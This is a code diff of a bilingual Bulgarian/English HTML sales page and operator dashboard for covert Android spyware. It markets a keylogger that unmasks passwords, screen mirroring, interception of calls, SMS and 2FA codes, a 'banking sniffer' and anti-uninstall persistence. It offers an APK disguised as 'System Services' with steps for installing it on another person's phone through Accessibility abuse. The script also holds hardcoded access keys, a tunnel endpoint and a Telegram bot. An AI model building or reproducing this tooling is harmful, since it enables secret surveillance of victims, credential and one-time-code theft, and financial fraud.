+      <li><a href="#deployment" data-i18n="nav_deployment">Терминал & Инсталация</a></li>
+      <li><a href="#pricing" data-i18n="nav_pricing">Лицензиране</a></li>
+    </ul>
+
+    <div class="nav-actions">
+      <!-- Language Switcher -->
+      <div class="lang-switcher">
+        <button class="lang-btn active" id="btn-lang-bg" onclick="setLanguage('bg')">BG</button>
+        <button class="lang-btn" id="btn-lang-en" onclick="setLanguage('en')">EN</button>
+      </div>
+
+      <!-- Client Portal Entry Button -->
+      <button class="btn-portal-login" onclick="openAuthModal()">
+        <span>🔑</span> <span data-i18n="btn_login">Вход за Клиенти</span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <!-- EXECUTIVE SHOWCASE & PORTFOLIO (PUBLIC LANDING) -->
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <main id="executive-showcase">
+
+    <!-- HERO PRESENTATION -->
+    <section class="hero-section" id="overview">
+      <div class="hero-badge" data-i18n="hero_badge">
+        <span>⚡</span> SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE
+      </div>
+
+      <h1 class="hero-title" data-i18n="hero_title">
+        Автономна Мобилна Телеметрия и Дистанционен Контрол от Корпоративен Клас
+      </h1>
+
+      <p class="hero-lead" data-i18n="hero_lead">
+        Специализирана платформа като услуга (PaaS), осигуряваща пълен контрол на екрана на живо, декриптиране на въведени клавиши (Keylogger) и одит на комуникациите с нулев системен отпечатък и непрекъсната автономия.
+      </p>
+
+      <div class="hero-cta-group">
+        <a href="#download" class="btn-primary-cta" data-i18n="hero_btn_download">
+          <span>📥</span> Свали Инсталатора (APK)
+        </a>
+        <a href="#demo" class="btn-secondary-cta" data-i18n="hero_btn_demo">
+          <span>👁️</span> Интерактивно Демо
+        </a>
+        <button class="btn-secondary-cta" onclick="openAuthModal()" style="border-color: var(--cyan); color: var(--cyan);" data-i18n="hero_btn_login">
+          <span>🔑</span> Въведи Лицензен Ключ
+        </button>
+      </div>
+    </section>
+
+    <!-- METRICS STRIP -->
+    <div class="metrics-strip">
+      <div class="metric-card">
+        <div class="metric-value cyan">0.0000</div>
+        <div class="metric-label" data-i18n="metric_entropy">Ентропия в покой (Zero CPU)</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-value green">&lt; 35ms</div>
+        <div class="metric-label" data-i18n="metric_latency">WebSocket Забавяне</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-value gold">100%</div>
+        <div class="metric-label" data-i18n="metric_persistence">Anti-Uninstall Защита</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-value cyan">256-Bit</div>
+        <div class="metric-label" data-i18n="metric_encryption">Post-Quantum TLS Enclave</div>
+      </div>
     </div>
 
-    <button class="btn-auth" onclick="verifyAuth()">Unlock Vault</button>
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <!-- INTERACTIVE LIVE DEMO HUD (WHAT HAPPENS UPON ACTIVATION) -->
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <section class="section-header" id="demo">
+      <span class="section-tag" data-i18n="demo_tag">КАКВО ПОЛУЧАВАТЕ СЛЕД АКТИВАЦИЯ</span>
+      <h2 class="section-title" data-i18n="demo_title">Интерактивно Табло на Живо (Live Sandbox)</h2>
+      <p class="section-desc" data-i18n="demo_desc">
+        Тествайте симулацията по-долу: вижте как системата отразява екрана, прихваща разговори, декодира въведени пароли и отваря индивидуален изолиран портал за всеки клиент.
+      </p>
+    </section>
+
+    <div class="demo-sandbox">
+      <!-- Simulated Phone Screen -->
+      <div class="demo-phone">
+        <div class="demo-notch"></div>
+        <div class="demo-screen-content">
+          <div class="demo-screen-header">
+            <span>● 5G SYSTEMDEF</span>
+            <span>88% 🔋</span>
+          </div>
+
+          <div>
+            <div class="demo-app-card">
+              <div style="font-weight: 700; color: var(--cyan); margin-bottom: 2px;">💬 Telegram Secure</div>
+              <div style="color: var(--text-dim);">Нов вход от: 185.199.108.153 (Approved)</div>
+            </div>
+
+            <div class="demo-app-card">
+              <div style="font-weight: 700; color: var(--gold); margin-bottom: 2px;">🏦 Мобилно Банкиране</div>
+              <div style="color: var(--text-dim);">OTP Код: <strong>894-112</strong> за превод €4,500.00</div>
+            </div>
+          </div>
+
+          <div class="demo-typing-box">
+            <div style="font-size: 9px; color: var(--cyan); margin-bottom: 2px;">⌨️ LIVE UNMASKED INPUT:</div>
+            <div id="sim-typing-text">Passwd: S0ver3ign2026!</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo Control & Data Tabs -->
+      <div class="demo-control-panel">
+        <div class="demo-nav-tabs">
+          <button class="demo-tab-btn active" onclick="switchDemoTab('demo-keystrokes')">⌨️ Клавишен Лог (Unmasked)</button>
+          <button class="demo-tab-btn" onclick="switchDemoTab('demo-comms')">📞 Разговори & SMS</button>
+          <button class="demo-tab-btn" onclick="switchDemoTab('demo-telemetry')">🔋 Хардуерна Телеметрия</button>
+        </div>
+
+        <!-- TAB 1: KEYSTROKES -->
+        <div id="demo-keystrokes" class="demo-tab-pane active">
+          <table class="demo-data-table">
+            <thead>
+              <tr>
+                <th>ВРЕМЕ</th>
+                <th>ПРИЛОЖЕНИЕ</th>
+                <th>ДЕКРИПТИРАН ТЕКСТ / ПАРОЛА</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td style="color: var(--cyan);">16:42:10</td>
+                <td><span style="color: var(--gold);">com.android.chrome</span></td>
+                <td><code>https://banking.portal.com/login</code></td>
+              </tr>
+              <tr>
+                <td style="color: var(--cyan);">16:42:15</td>
+                <td><span style="color: var(--green);">com.android.chrome</span></td>
+                <td><code>User: executive_officer@corp.bg</code></td>
+              </tr>
+              <tr>
+                <td style="color: var(--cyan);">16:42:22</td>
+                <td><span style="color: var(--red);">[UNMASKED PASSWORD]</span></td>
+                <td><code>S0ver3ign2026!</code> <span style="font-size: 10px; color: var(--green);">(Точките са разкодирани)</span></td>
+              </tr>
+              <tr>
+                <td style="color: var(--cyan);">16:43:01</td>
+                <td><span style="color: var(--purple);">org.telegram.messenger</span></td>
+                <td><code>"Срещата в Цюрих е потвърдена за 14:00."</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- TAB 2: COMMS -->
+        <div id="demo-comms" class="demo-tab-pane">
+          <table class="demo-data-table">
+            <thead>
+              <tr>
+                <th>ТИП</th>
+                <th>НОМЕР / СЪБИТИЕ</th>
+                <th>ПРОДЪЛЖИТЕЛНОСТ / ДЕТАЙЛИ</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><span style="color: var(--green);">📞 Входящ</span></td>
+                <td>+359 89 684 9882 (Димитър)</td>
+                <td>04:12 мин. [Аудио канал стабилен]</td>
+              </tr>
+              <tr>
+                <td><span style="color: var(--cyan);">💬 SMS 2FA</span></td>
+                <td>Revolut Security</td>
+                <td><code>"Вашият код за потвърждение е 551942"</code></td>
+              </tr>
+              <tr>
+                <td><span style="color: var(--gold);">📞 Изходящ</span></td>
+                <td>+41 22 819 0000 (Geneva HQ)</td>
+                <td>08:45 мин. [Записано събитие]</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- TAB 3: TELEMETRY -->
+        <div id="demo-telemetry" class="demo-tab-pane">
+          <table class="demo-data-table">
+            <thead>
+              <tr>
+                <th>ПАРАМЕТЪР</th>
+                <th>СТОЙНОСТ</th>
+                <th>СТАТУС</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Хардуерен Чипсет</td>
+                <td>Qualcomm Snapdragon 8 Gen 3</td>
+                <td><span style="color: var(--green);">🟢 Номинален</span></td>
+              </tr>
+              <tr>
+                <td>Батерия & Напрежение</td>
+                <td>88% (4.28V | 31.4°C)</td>
+                <td><span style="color: var(--green);">🟢 Студен режим (Zero Drain)</span></td>
+              </tr>
+              <tr>
+                <td>Мрежов Канал</td>
+                <td>5G NR NSA (Carrier: A1 / Yettel)</td>
+                <td><span style="color: var(--cyan);">🔒 AES-GCM Encrypted</span></td>
+              </tr>
+              <tr>
+                <td>Режим Защита</td>
+                <td>Anti-Uninstall Active (Home-Lock)</td>
+                <td><span style="color: var(--gold);">🛡️ Защитен от изтриване</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <!-- INTERACTIVE DEPLOYMENT TERMINAL -->
+    <!-- ══════════════════════════════════════════════════════════════ */
+    <section class="section-header" id="deployment">
+      <span class="section-tag" data-i18n="term_tag">АВТОНОМНО РАЗГРЪЩАНЕ</span>
+      <h2 class="section-title" data-i18n="term_title">Интерактивна Конзола за Инсталация</h2>
+      <p class="section-desc" data-i18n="term_desc">
+        Вижте стъпка по стъпка как се инсталира софтуерът на чуждо устройство и как Telegram ботът веднага генерира самостоятелната изолирана сесия.
+      </p>
+    </section>
+
+    <div class="terminal-wrapper">
+      <div class="terminal-header">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-yellow"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <div class="terminal-title">AETERNA_DEPLOYMENT_ENGINE // BASH_V8</div>
+        <div style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green);">STATUS: READY</div>
+      </div>
+
+      <div class="terminal-body" id="deployment-term-body">
+        <div class="term-line">
+          <span class="term-prompt">aeterna@sovereign:~$</span>
+          <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Android_SM-S928B"</span>
+        </div>
+        <div class="term-line"><span class="term-info">[1/5] Проверка на инсталационния пакет AETERNA_SYSTEMDEF_INSTALLER.apk...</span></div>
+        <div class="term-line"><span class="term-success"> ✔ Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>
+        <div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга 'System Services' и маскиране...</span></div>
+        <div class="term-line"><span class="term-success"> ✔ Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>
+        <div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@Shanoto7bot)...</span></div>
+        <div class="term-line"><span class="term-success"> ✔ Създаден нов Topic/стая в супергрупа 'Scan': 📱 samsung SM-S928B (+359896849882).</span></div>
+        <div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>
+        <div class="term-line" style="color: var(--cyan); font-weight: 700;">
+          <span> 🔗 ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span>
+          <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span>
+        </div>
+        <div class="term-line"><span class="term-success">[5/5] Ентропията е свита до 0.0000. Системата е в готовност.</span></div>
+      </div>
+
+      <div class="terminal-footer">
+        <div style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted);" data-i18n="term_footer_text">
+          Всяка инсталация автоматично генерира свой самостоятелен линк и Telegram тема.
+        </div>
+        <button class="btn-term-action" onclick="replayTerminalSequence()">
+          <span>🔄</span> <span data-i18n="term_btn_replay">Повтори Симулацията</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <!-- DIRECT APK DOWNLOAD & STEP-BY-STEP INSTRUCTIONS -->
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <div class="download-grid" id="download">
+      <!-- APK Download Card -->
+      <div class="download-card">
+        <div>
+          <div class="apk-meta-badge">
+            <span>🛡️</span> 100% CLEAN // NO METADATA LEAK
+          </div>
+          <h3 style="font-size: 26px; font-weight: 800; color: #fff; margin-bottom: 8px;">
+            AETERNA SystemDef Installer
+          </h3>
+          <p style="font-size: 14px; color: var(--text-dim); line-height: 1.6;">
+            Официален корпоративен пакет, маскиран като стандартна системна услуга (System Services). Готов за директна инсталация на всяко Android устройство.
+          </p>
+
+          <ul class="apk-spec-list">
+            <li><span>Име на пакета:</span> <strong>com.aeterna.systemdef</strong></li>
+            <li><span>Показвано име:</span> <strong>System Services</strong></li>
+            <li><span>Версия:</span> <strong>v2.4.0-Enterprise</strong></li>
+            <li><span>Размер на файла:</span> <strong>6.74 MB</strong></li>
+            <li><span>Съвместимост:</span> <strong>Android 8.0 — Android 16 (OneUI 7+)</strong></li>
+          </ul>
+        </div>
+
+        <a href="AETERNA_SYSTEMDEF_INSTALLER.apk" download="AETERNA_SYSTEMDEF_INSTALLER.apk" class="btn-download-apk">
+          <span>📥</span> <span>СВАЛИ ОФИЦИАЛНИЯ APK (6.74 MB)</span>
+        </a>
+      </div>
+
+      <!-- Instructions Card -->
+      <div class="steps-card">
+        <h3 style="font-size: 22px; font-weight: 800; color: #fff; margin-bottom: 20px;" data-i18n="steps_title">
+          Указания за Инсталация на Друг Телефон
+        </h3>
+
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <div class="step-text">
+            <h4 data-i18n="step1_title">Изтегляне и Стартиране</h4>
+            <p data-i18n="step1_desc">
+              Прехвърлете или изтеглете APK файла на целевия телефон. Разрешете „Инсталиране от неизвестни източници“ (Install Unknown Apps), ако операционната система поиска потвърждение.
+            </p>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <div class="step-text">
+            <h4 data-i18n="step2_title">Активиране на Достъпност (Accessibility)</h4>
+            <p data-i18n="step2_desc">
+              Отворете приложението веднъж. Отидете в <strong>Настройки ➔ Достъпност (Accessibility) ➔ Инсталирани приложения (Installed Apps) ➔ System Services</strong> и включете превключвателя. Това активира прехвата на екран, клавиши и съобщения.
+            </p>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <div class="step-text">
+            <h4 data-i18n="step3_title">Автономно Свързване</h4>
+            <p data-i18n="step3_desc">
+              След като услугата се включи, телефонът автоматично се свързва, отваря новата стая в Telegram бота и генерира вашия личен портален линк на <code>paas.website</code>.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <!-- PRICING & LICENSING MATRIX -->
+    <!-- ══════════════════════════════════════════════════════════════ -->
+    <section class="section-header" id="pricing">
+      <span class="section-tag" data-i18n="pricing_tag">КОРПОРАТИВНИ ПЛАНОВЕ</span>
+      <h2 class="section-title" data-i18n="pricing_title">Гъвкаво Лицензиране за Бизнес Клиенти</h2>
+      <p class="section-desc" data-i18n="pricing_desc">
+        Изберете подходящия лиценз според броя наблюдавани активи. Всеки абонамент включва моментално издаване на лицензен ключ и денонощна техническа поддръжка.
+      </p>
+    </section>
+
+    <div class="pricing-grid">
+      <!-- Tier 1 -->
+      <div class="pricing-card">
+        <div>
+          <h3 class="plan-title">Single Asset Sentinel</h3>
+          <p class="plan-desc">Идеален за персонален надзор на 1 конкретно устройство с пълен изолиран достъп.</p>
+          <div class="plan-price">€49 <span>/ месец</span></div>
+
+          <ul class="plan-features">
+            <li><span>✔</span> 1 Активно Устройство</li>
+            <li><span>✔</span> Live Mirroring на Екрана</li>
+            <li><span>✔</span> Пълен Unmasked Keylogger</li>
+            <li><span>✔</span> Запис на Разговори & SMS</li>
+            <li><span>✔</span> Собствен Telegram Бот Канал</li>
+          </ul>
+        </div>
+        <button class="btn-plan" onclick="openAuthModal()">Активирай Лиценз</button>
+      </div>
+
+      <!-- Tier 2: Featured -->
+      <div class="pricing-card featured">
+        <div class="featured-tag">НАЙ-ПРЕДПОЧИТАН</div>
+        <div>
+          <h3 class="plan-title">Executive Fleet Pro</h3>
+          <p class="plan-desc">Проектиран за бизнес ръководители и малки флотилии от критични корпоративни устройства.</p>
+          <div class="plan-price">€199 <span>/ месец</span></div>
+
+          <ul class="plan-features">
+            <li><span>✔</span> До 5 Наблюдавани Устройства</li>
+            <li><span>✔</span> Изолирани Сесии за Всяко Устройство</li>
+            <li><span>✔</span> Отдалечен Тъч и Жестове (Remote Control)</li>
+            <li><span>✔</span> Пълен Банков & USSD Sniffer</li>
+            <li><span>✔</span> Приоритетен 35ms WebSocket Мост</li>
+            <li><span>✔</span> Защита от Деинсталиране (Home-Lock)</li>
+          </ul>
+        </div>
+        <button class="btn-plan featured" onclick="openAuthModal()">Избери Fleet Pro</button>
+      </div>
+
+      <!-- Tier 3 -->
+      <div class="pricing-card">
+        <div>
+          <h3 class="plan-title">Sovereign Enterprise</h3>
+          <p class="plan-desc">За корпорации и институции, изискващи самостоятелен хостинг и пълен Master Root достъп.</p>
+          <div class="plan-price">По договаряне</div>
+
+          <ul class="plan-features">
+            <li><span>✔</span> Неограничен Брой Устройства</li>
+            <li><span>✔</span> Master Sovereign HUD (Главен панел)</li>
+            <li><span>✔</span> Собствен Домейн и Частен Сървър</li>
+            <li><span>✔</span> Директно ADB Хардуерно Управление</li>
+            <li><span>✔</span> Пълна Невидимост и Персонализирани Икони</li>
+          </ul>
+        </div>
+        <button class="btn-plan" onclick="openAuthModal()">Свържи се с Нас</button>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <!-- PASSKEY LOGIN MODAL (CLIENT PORTAL ACCESS) -->
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <div id="auth-modal">
+    <div class="auth-modal-card">
+      <button class="modal-close-btn" onclick="closeAuthModal()">✕</button>
+      <div style="font-size: 32px; margin-bottom: 12px;">🛡️</div>
+      <h3 class="modal-logo">AETERNA // SYSTEMDEF</h3>
+      <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 1px;">
+        SOVEREIGN CLIENT & ARCHITECT VAULT
+      </p>
+
+      <div class="input-pass-wrap">
+        <label data-i18n="modal_passkey_label">Лицензен Ключ / Passkey</label>
+        <input type="password" id="passkey-input" placeholder="Въведете вашия ключ..." autofocus>
+      </div>
+
+      <button class="btn-modal-unlock" onclick="verifyAuth()" data-i18n="modal_btn_unlock">
+        ОТКЛЮЧИ ТАБЛОТО
+      </button>
+
+      <div style="margin-top: 20px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim);">
+        <span data-i18n="modal_hint">Нямате парола? Изберете абонамент или се свържете с вашия администратор.</span>
+      </div>
+    </div>
   </div>
 
-  <!-- DASHBOARD -->
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <!-- DASHBOARD SCREEN (ACTIVE HARDWARE TELEMETRY PORTAL) -->
+  <!-- ══════════════════════════════════════════════════════════════ -->
   <div id="dashboard-screen">
     <div class="dash-header">
       <div>
@@ -429,82 +1732,97 @@
 
     <!-- TABS -->
     <div class="tabs-bar">
-      <button class="tab-btn active" onclick="switchTab('tab-mirror')">📱 Live Mirror</button>
-      <button class="tab-btn" onclick="switchTab('tab-tg')">🤖 Telegram Feed <span class="tab-badge" id="b-tg">0</span></button>
-      <button class="tab-btn" onclick="switchTab('tab-notifs')">🔔 Notifications <span class="tab-badge" id="b-notifs">0</span></button>
-      <button class="tab-btn" onclick="switchTab('tab-calls')">📞 Calls <span class="tab-badge" id="b-calls">0</span></button>
-      <button class="tab-btn" onclick="switchTab('tab-sms')">✉️ SMS <span class="tab-badge" id="b-sms">0</span></button>
-      <button class="tab-btn" onclick="switchTab('tab-contacts')">👥 Tracker <span class="tab-badge" id="b-contacts">0</span></button>
-      <button class="tab-btn" onclick="switchTab('tab-keylog')">⌨️ Keylogs <span class="tab-badge" id="b-keylog">0</span></button>
+      <button class="tab-btn active" onclick="switchTab('tab-mirror')">
+        📱 Live Mirror
+      </button>
+      <button class="tab-btn" onclick="switchTab('tab-telegram')">
+        💬 Telegram Feed <span class="tab-badge" id="badge-events">0</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('tab-notifs')">
+        🔔 Notifications <span class="tab-badge" id="badge-notifs">0</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('tab-calls')">
+        📞 Calls <span class="tab-badge" id="badge-calls">0</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('tab-sms')">
+        💬 SMS <span class="tab-badge" id="badge-sms">0</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('tab-contacts')">
+        👥 Contacts & Chats <span class="tab-badge" id="badge-contacts">0</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('tab-keylog')">
+        ⌨️ Keylogs <span class="tab-badge" id="badge-keylogs">0</span>
+      </button>
     </div>
 
-    <!-- VIEW 1: LIVE MIRROR -->
+    <!-- VIEW 1: LIVE MIRROR & REMOTE CONTROL -->
     <div id="tab-mirror" class="view-content active">
       <div class="viewport-layout">
+        <!-- Phone Display Container -->
         <div class="phone-wrapper">
-          <div class="phone-container">
+          <div class="phone-container" id="phone-screen-container">
             <div class="phone-notch"></div>
-            <img id="live-screen-img" class="phone-screen-img" src="" alt="" style="cursor: crosshair; user-select: none;">
-            <div id="touch-indicator" style="position: absolute; width: 24px; height: 24px; border: 2px solid var(--cyan); border-radius: 50%; background: rgba(0, 240, 255, 0.4); transform: translate(-50%, -50%); display: none; pointer-events: none; z-index: 30;"></div>
+            <img id="live-screen-img" src="" alt="Очаква се видео поток от устройството...">
+            <div class="touch-indicator" id="touch-indicator"></div>
           </div>
           
-          <div class="phone-controls-panel">
-            <div style="display: flex; gap: 8px; width: 100%;">
-              <button class="btn-ctrl" style="background: rgba(0, 240, 255, 0.15); border-color: var(--cyan); color: var(--cyan); font-weight: 800;" onclick="unlockPhone()">🔓 Unlock Phone</button>
-              <button class="btn-ctrl" onclick="sendDeviceKey('POWER')">🔒 Power</button>
+          <!-- Virtual Navigation Controls -->
+          <div class="controls-panel">
+            <div class="ctrl-row">
+              <button class="btn-ctrl" onclick="sendDeviceKey('BACK')">◀ Назад</button>
+              <button class="btn-ctrl" onclick="sendDeviceKey('HOME')">● Начало</button>
+              <button class="btn-ctrl" onclick="sendDeviceKey('RECENTS')">■ Скорошни</button>
             </div>
-
-            <div style="display: flex; gap: 8px; width: 100%;">
-              <button class="btn-ctrl" onclick="sendDeviceKey('BACK')">◀ Back</button>
-              <button class="btn-ctrl" onclick="sendDeviceKey('HOME')">● Home</button>
-              <button class="btn-ctrl" onclick="sendDeviceKey('RECENTS')">■ Recents</button>
+            <div class="ctrl-row">
+              <button class="btn-ctrl" onclick="sendSwipeGesture('UP')">⬆ Скрол Нагоре</button>
+              <button class="btn-ctrl" onclick="sendSwipeGesture('DOWN')">⬇ Скрол Надолу</button>
+              <button class="btn-ctrl" onclick="sendDeviceKey('POWER')">⚡ Захранване</button>
             </div>
-
-            <div style="display: flex; gap: 8px; width: 100%;">
-              <button class="btn-ctrl" onclick="sendSwipeGesture('UP')">▲ Swipe Up</button>
-              <button class="btn-ctrl" onclick="sendSwipeGesture('DOWN')">▼ Swipe Down</button>
-            </div>
-
-            <div style="display: flex; gap: 6px; width: 100%;">
-              <input type="text" id="type-text-input" placeholder="Въведете текст / PIN..." style="flex: 1; background: #020306; border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-family: 'JetBrains Mono'; font-size: 11px; color: #fff; outline: none;">
-              <button class="btn-ctrl" style="background: var(--cyan); color: #000; font-weight: 800;" onclick="sendTypeText()">Send</button>
+            <div class="ctrl-row" style="margin-top: 4px;">
+              <input type="text" id="type-text-input" placeholder="Въведи текст / ПИН..." style="flex: 2; background: #020408; border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #fff; outline: none;">
+              <button class="btn-ctrl" onclick="sendTypeText()" style="flex: 1;">⌨ Въведи</button>
+              <button class="btn-ctrl" onclick="unlockPhone()" style="flex: 1; border-color: var(--green); color: var(--green);">🔓 Отключи</button>
             </div>
           </div>
         </div>
 
-        <div style="display: flex; flex-direction: column; gap: 14px;">
-          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;">
-            <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px;">
-              <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--muted);">BATTERY</div>
-              <div id="val-battery" style="font-size: 22px; font-weight: 800; color: var(--green);">100 %</div>
-              <div id="desc-battery" style="font-size: 10px; color: var(--muted);">4.3V | 36.9 °C</div>
+        <!-- Telemetry & Live Events Feed -->
+        <div class="side-telemetry">
+          <!-- Live Battery & System Status -->
+          <div class="battery-widget">
+            <div>
+              <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted); text-transform: uppercase;">Battery</div>
+              <div style="font-size: 20px; font-weight: 800; color: var(--green);" id="battery-pct">-- %</div>
+              <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted);" id="battery-voltage">0.00V | 0.0°C</div>
             </div>
-            <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px;">
-              <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--muted);">KNOX SECURITY</div>
-              <div style="font-size: 22px; font-weight: 800; color: var(--cyan);">LOCKED</div>
-              <div style="font-size: 10px; color: var(--muted);">Zero-Trust Enforced</div>
+            <div style="text-align: right;">
+              <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted); text-transform: uppercase;">Endpoint</div>
+              <div style="font-size: 12px; font-weight: 700; color: var(--cyan);" id="live-device-model">Connecting...</div>
+              <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted);" id="live-connection-type">WebSocket Live</div>
             </div>
           </div>
 
-          <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px; flex: 1;">
-            <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--gold); margin-bottom: 10px;">
-              LIVE RECENT FEED
+          <!-- Real-Time Activity Log -->
+          <div style="background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 16px; flex: 1; min-height: 380px; display: flex; flex-direction: column;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+              <span style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--gold); font-weight: 700;">⚡ LIVE RECENT FEED</span>
+              <button onclick="refreshScreen()" style="background: transparent; border: 1px solid var(--border); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 2px 6px; border-radius: 4px; cursor: pointer;">Refresh Frame</button>
             </div>
-            <div id="recent-stream" style="font-family: 'JetBrains Mono'; font-size: 11px; height: 320px; overflow-y: auto; color: #9cdcfe; line-height: 1.6;">
-              <div>[SYNC] Telemetry & Ingestion Gateway Connected.</div>
+            <div id="side-feed-list" style="flex: 1; overflow-y: auto; max-height: 480px; display: flex; flex-direction: column; gap: 8px; font-family: 'JetBrains Mono', monospace; font-size: 11px;">
+              <div style="color: var(--muted);">Очаква се телеметричен поток...</div>
             </div>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- VIEW: TELEGRAM LIVE FEED SYNC -->
-    <div id="tab-tg" class="view-content">
+    <!-- VIEW 1.5: TELEGRAM FEED -->
+    <div id="tab-telegram" class="view-content">
       <div class="filter-bar">
-        <input type="text" id="filter-tg" placeholder="Търсене в Telegram потока..." oninput="renderTelegramFeed()">
+        <input type="text" id="filter-telegram" placeholder="Търсене в Telegram събитията..." oninput="renderTelegramFeed()">
         <button class="btn-clear" onclick="clearData()">Clear All</button>
       </div>
-      <div class="data-grid" id="grid-tg"></div>
+      <div class="data-grid" id="grid-telegram"></div>
     </div>
 
     <!-- VIEW 2: NOTIFICATIONS -->
@@ -547,38 +1865,210 @@
       </div>
       <div class="data-grid" id="grid-keylogs"></div>
     </div>
-
   </div>
 
+  <!-- ══════════════════════════════════════════════════════════════ -->
+  <!-- APPLICATION ENGINE & SCRIPT LAYER -->
+  <!-- ══════════════════════════════════════════════════════════════ -->
   <script>
     // 🔐 DUAL-TIER ACCESS MATRIX:
-    // 1. SOVEREIGN ARCHITECT (Master Control + Wipe + Direct ADB Hardware Actions):
     const ARCHITECT_MASTER_KEYS = ["aeterna2026", "0x4121", "dimitar"];
-    // 2. GENERAL PORTAL ACCESS (Fleet Monitoring & Read-Only / Standard Vault):
     const GENERAL_USER_KEYS = ["vault2026", "telemetry777", "systemdef", "aeterna"];
 
     const HOST_ENDPOINT = "https://swim-adjustments-soldiers-personality.trycloudflare.com";
 
     let currentUserRole = "GUEST"; // "ARCHITECT" or "VIEWER"
     let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };
+    let selectedDeviceId = "ALL";
+    let devicesList = [];
 
+    // BILINGUAL DICTIONARY (BG / EN)
+    const i18n = {
+      bg: {
+        nav_overview: "Възможности",
+        nav_demo: "Live Демо",
+        nav_deployment: "Терминал & Инсталация",
+        nav_pricing: "Лицензиране",
+        btn_login: "Вход за Клиенти",
+        hero_badge: "⚡ SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
+        hero_title: "Автономна Мобилна Телеметрия и Дистанционен Контрол от Корпоративен Клас",
+        hero_lead: "Специализирана платформа като услуга (PaaS), осигуряваща пълен контрол на екрана на живо, декриптиране на въведени клавиши (Keylogger) и одит на комуникациите с нулев системен отпечатък и непрекъсната автономия.",
+        hero_btn_download: "📥 Свали Инсталатора (APK)",
+        hero_btn_demo: "👁️ Интерактивно Демо",
+        hero_btn_login: "🔑 Въведи Лицензен Ключ",
+        metric_entropy: "Ентропия в покой (Zero CPU)",
+        metric_latency: "WebSocket Забавяне",
+        metric_persistence: "Anti-Uninstall Защита",
+        metric_encryption: "Post-Quantum TLS Enclave",
+        demo_tag: "КАКВО ПОЛУЧАВАТЕ СЛЕД АКТИВАЦИЯ",
+        demo_title: "Интерактивно Табло на Живо (Live Sandbox)",
+        demo_desc: "Тествайте симулацията по-долу: вижте как системата отразява екрана, прихваща разговори, декодира въведени пароли и отваря индивидуален изолиран портал за всеки клиент.",
